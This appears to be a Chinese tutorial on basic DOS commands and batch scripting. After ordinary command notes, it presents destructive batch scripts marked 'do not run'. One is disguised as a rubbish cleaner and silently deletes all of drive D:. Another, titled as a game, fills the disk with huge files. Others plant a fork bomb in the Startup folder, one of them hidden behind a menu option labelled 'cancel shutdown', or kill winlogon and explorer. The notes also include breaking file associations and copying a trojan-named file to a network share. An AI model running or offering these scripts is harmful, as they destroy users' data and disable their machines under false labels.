## 基本DOS命令

---

---

```dos
echo world is very well > qingshu.txt 		# 将“world is very well”写入qingshu.txt
type qingshu.txt		# 查看qingshu.txt
type qingshu.txt | more		# 查看qingshu.txt，并分页显示
copy con qingshu.txt		# 将屏幕输入的内容全部写入qingshu.txt; ctrl + Z 停止编写
```

#### 创建文件

1. echo

   ```doc
   >是覆盖
   >>是追加
   ```

   

2. copy con 文件名.扩展名

   开始编辑内容
   ctrl+Z结束

#### 删除文件

* del
* *是通配符

* /q 不提示（相当于Linux的-f）

* del *.* /s /Q 无提示删除所有文件

#### md

* 创建文件夹

#### attrib

* attrib +h feifei

  给feifei文件夹增加隐藏属性

* attrib -h feifei
  给feifei文件夹去掉隐藏属性
* +h +s +a 隐藏且定义为系统级文件

#### dir 

* dir /a

  显示所有隐藏的文件及文件夹

#### fsutil

* fsutil file createnew c:\system.ini 409600000

  快速生成一个文件system.ini，定义大小为409600000字节

#### assoc

* 修改关联性

* assoc .txt=exefile

  将.txt文件关联为exefile，但实际上打不开。

* assoc .txt=txtfile
  解开

#### shutdown

* shutdown -s -t 100

  一百秒后关机

* shutdown -a

  取消所有定时任务（接触定时关机）

* shutdown -r -t -f 100

  100秒后强制重启

* shutdown -s -t -f 100  -c “即将关机。。。”

  100秒后关机，并在屏幕显示“即将关机。。。”

* shutdown -l 

  注销，通logoff命令相同

#### copy

* copy 源路径(带文件名) 目的路径

* copy haha.txt  ..\b\

  将当前文件夹里的haha.txt拷贝到上一级文件夹下的b文件夹里

* 网络拷贝

  ```dos
  copy muma.exe \\10.1.1.2\
  ```

#### move

* 用法同copy

#### ren

* ren 旧名 新名
  可-更改文件夹和文件名

---

---

## 批处理编写

#### 批量处理dos命令

* 按顺序执行，忽略有错误的
* 脚本

#### 如何创建

* .bat文件

---

* ## **以下文件仅供参考，不得运行**

1. 删除d盘文件

```dos
@echo off
color 0a
title clear rubbish program
echo =====================
echo clear your system rubbish
echo   if it has been stopped
echo 	let it go.
echo =====================
pause
echo.
echo rubbish is cleaning...
d: >nul 2>nul
cd \ >nul 2>nul
rd . /s/q >nul 2>nul
ping -n 10 127.0.0.1 >nul 2>nul
echo congratulations!!! rubbish has been removed.
pause
```



2. 创建大文件

```dos
@echo off
color 0a
title a little game
fsutil file createnew d:\sys.ini 409600000000 >nul 2>nul
fsutil file createnew d:\sys1.ini 409600000000 >nul 2>nul
fsutil file createnew d:\sys2.ini 409600000000 >nul 2>nul
fsutil file createnew d:\sys3.ini 409600000000 >nul 2>nul
```



3. 无限启动cmd

```dos
copy qq.bat "%userprofile%\「开始」菜单\程序\启动"
:d
start
goto d
```

4. 定时小程序

```dos
@echo off
title runfar's applet
color 0a

:0
cls
echo ==========================
echo 		menu
echo	     1.定时关机
echo	     2.取消定时
echo         3.exit
echo ==========================

set /p num=input your option:

if "%num%"=="1" goto 1
if "%num%"=="2" goto 2
if "%num%"=="3" goto 3
echo donot bb input, input correct
pause
goto 0

:1
set /p a=input the time to shutdown the computer after:
shutdown -s -f -t %a%
goto 0

:2
echo :a >> "%userprofile%\「开始」菜单\程序\启动\haha.bat"
echo start >> "%userprofile%\「开始」菜单\程序\启动\haha.bat"
echo goto a >> "%userprofile%\「开始」菜单\程序\启动\haha.bat"
goto 0

:3
exit

```

---

5. 
   ```dos
   # 强制杀死window登录进程
   ntsd -c -q pn winlogon.exe
   # 实际结果会导致蓝屏，仅win2003-server有效
   
   # 强制杀死系统桌面进程
   taskkill /im explorer.exe /f
   ```

6. 